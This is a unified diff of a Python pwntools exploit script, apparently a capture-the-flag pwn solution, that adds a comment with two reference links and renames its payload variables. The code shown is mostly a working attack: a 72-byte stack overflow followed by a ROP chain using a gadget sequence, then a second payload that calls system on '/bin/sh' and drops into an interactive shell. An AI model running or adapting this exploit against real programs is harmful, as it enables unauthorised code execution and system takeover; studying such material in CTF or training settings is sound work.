@@ -1,3 +1,9 @@
+'''
+参考链接：
+https://www.anquanke.com/post/id/85129
+https://xz.aliyun.com/t/5597
+'''
+
 from pwn import*
 
 context.log_level = 'DEBUG'
@@ -51,7 +57,7 @@ log.info("system_addr = %#x", system_addr)
 
 input('continue?')
 
-payload0 = flat(
+payload = flat(
     b'a'*72,
     gadget1,
     0, # rbx
@@ -64,16 +70,16 @@ payload0 = flat(
     b'\0' * 56,
     start_addr
 )
-payload0 = payload0.ljust(200, b'a')
+payload = payload.ljust(200, b'a')
 
-p.send(payload0)
+p.send(payload)
 
 p.recvuntil(b'bye~\n') #先显示bye才调用的read
 p.send(b'/bin/sh\0')
 
-payload1 = b"A"*72 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
-payload1 = payload1.ljust(200, b"A")
+payload = b"A"*72 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
+payload = payload.ljust(200, b"A")
 
-p.send(payload1)
+p.send(payload)
 
 p.interactive()
